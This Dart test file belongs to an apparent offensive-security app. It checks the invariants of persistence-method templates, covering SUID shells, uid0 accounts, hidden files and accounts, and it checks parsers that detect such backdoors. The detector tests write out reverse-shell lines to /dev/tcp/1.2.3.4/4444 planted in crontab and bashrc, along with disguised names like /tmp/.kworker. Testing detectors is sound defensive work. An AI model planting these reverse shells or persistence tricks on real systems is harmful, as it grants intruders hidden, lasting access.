import 'package:flutter_test/flutter_test.dart';
import 'package:matrix/pages/persistence_methods.dart';
import 'package:matrix/pages/priv_esc_landing.dart';

/// Extract every `{placeholder}` token from a template string.
Set<String> placeholdersOf(String template) {
  return RegExp(r'\{([a-zA-Z_][a-zA-Z0-9_]*)\}')
      .allMatches(template)
      .map((m) => m.group(1)!)
      .toSet();
}

void main() {
  group('method invariants', () {
    test('all method ids are unique', () {
      final ids = allPersistMethods.map((m) => m.id).toList();
      expect(ids.toSet().length, ids.length);
    });

    test('every deploy template emits DEPLOY_OK', () {
      for (final m in allPersistMethods) {
        expect(m.deployTemplate, contains('DEPLOY_OK'), reason: m.id);
      }
    });

    test('every verify template is non-empty', () {
      for (final m in allPersistMethods) {
        expect(m.verifyTemplate, isNotEmpty, reason: m.id);
      }
    });

    test('executable suid_shell verify runs id; structural root_user emits VERIFY_OK', () {
      final suid = allPersistMethods.firstWhere((m) => m.id == 'suid_shell');
      expect(suid.verifyStrength, LandingVerifyStrength.executable);
      expect(suid.verifyTemplate, contains('id'));

      final rootUser = allPersistMethods.firstWhere((m) => m.id == 'root_user');
      expect(rootUser.verifyStrength, LandingVerifyStrength.structural);
      expect(rootUser.verifyTemplate, contains('VERIFY_OK'));
    });

    test('no dangling placeholders — every {token} is a declared param', () {
      for (final m in allPersistMethods) {
        final declared = m.params.map((p) => p.id).toSet();
        final templates = [
          m.deployTemplate,
          m.verifyTemplate,
          if (m.rollbackTemplate != null) m.rollbackTemplate!,
        ];
        for (final t in templates) {
          for (final token in placeholdersOf(t)) {
            expect(declared, contains(token),
                reason: '${m.id} references undeclared {$token}');
          }
        }
      }
    });

    test('no orphan params — every declared param is referenced', () {
      for (final m in allPersistMethods) {
        final referenced = <String>{};
        for (final t in [
          m.deployTemplate,
          m.verifyTemplate,
          if (m.rollbackTemplate != null) m.rollbackTemplate!,
        ]) {
          referenced.addAll(placeholdersOf(t));
        }
        for (final p in m.params) {
          expect(referenced, contains(p.id),
              reason: '${m.id} declares unused param {${p.id}}');
        }
      }
    });

    test('checkCommand and preflightCommands have no placeholders', () {
      for (final m in allPersistMethods) {
        expect(placeholdersOf(m.checkCommand), isEmpty,
            reason: '${m.id} checkCommand runs without substitution');
        for (final p in m.preflightCommands) {
          expect(placeholdersOf(p), isEmpty,
              reason: '${m.id} preflight runs without substitution');
        }
      }
    });
  });

  group('group invariants', () {
    test('every group method id resolves to a real method', () {
      final ids = allPersistMethods.map((m) => m.id).toSet();
      for (final g in allPersistGroups) {
        for (final m in g.methods) {
          expect(ids, contains(m.id));
        }
      }
    });

    test('traces group is present', () {
      expect(allPersistGroups.map((g) => g.id), contains('traces'));
    });

    test('filterPersistGroups returns only the requested platform', () {
      final linux = filterPersistGroups(false);
      for (final g in linux) {
        expect(g.methods.every((m) => !m.isWindows), isTrue);
      }
      final windows = filterPersistGroups(true);
      for (final g in windows) {
        expect(g.methods.every((m) => m.isWindows), isTrue);
      }
      // A cross-platform-free set still yields at least one group per platform.
      expect(linux, isNotEmpty);
      expect(windows, isNotEmpty);
    });
  });

  group('toDotPath', () {
    test('dot-prefixes a basename', () {
      expect(toDotPath('/tmp/kworker'), '/tmp/.kworker');
      expect(toDotPath('kworker'), '.kworker');
    });

    test('is idempotent on already-hidden paths', () {
      expect(toDotPath('/tmp/.kworker'), '/tmp/.kworker');
      expect(toDotPath('.kworker'), '.kworker');
    });
  });

  group('detection parsers', () {
    test('parseCron returns clean on empty crontab', () {
      final r = parseCron('(no crontab or empty)');
      expect(r.verdict, DetectionVerdict.clean);
    });

    test('parseCron flags reverse-shell entries', () {
      final r = parseCron('* * * * * bash -i >& /dev/tcp/1.2.3.4/4444 0>&1');
      expect(r.verdict, DetectionVerdict.suspicious);
    });

    test('parseBashrc flags /dev/tcp backdoor', () {
      final r = parseBashrc('export X=1\nbash -i >& /dev/tcp/1.2.3.4/4444');
      expect(r.verdict, DetectionVerdict.suspicious);
    });

    test('parseSshKeys returns clean on missing keys file', () {
      final r = parseSshKeys(r'(no authorized_keys at $HOME/.ssh)');
      expect(r.verdict, DetectionVerdict.clean);
    });

    test('parseSuid returns clean on no backdoor', () {
      expect(parseSuid('(no SUID backdoor found)').verdict,
          DetectionVerdict.clean);
    });

    test('parseSuid flags a SUID shell in /tmp', () {
      expect(parseSuid('/tmp/.kworker').verdict,
          DetectionVerdict.suspicious);
    });

    test('parseRootUser returns clean on no uid0 entries', () {
      expect(parseRootUser('(no UID 0 entries found)').verdict,
          DetectionVerdict.clean);
    });

    test('parseRootUser flags a non-root uid0 account', () {
      final r = parseRootUser('root:0\nmessagebus:0');
      expect(r.verdict, DetectionVerdict.suspicious);
    });

    test('parseHiddenAccount flags a dollar-suffixed account', () {
      final r = parseHiddenAccount(r'Administrator\nsvc_backup$');
      expect(r.verdict, DetectionVerdict.suspicious);
    });

    test('parseProfileD flags hidden dot-prefixed scripts', () {
      final r = parseProfileD('-rw-r--r-- 1 root root 12 .evil.sh');
      expect(r.verdict, DetectionVerdict.suspicious);
    });
  });
}
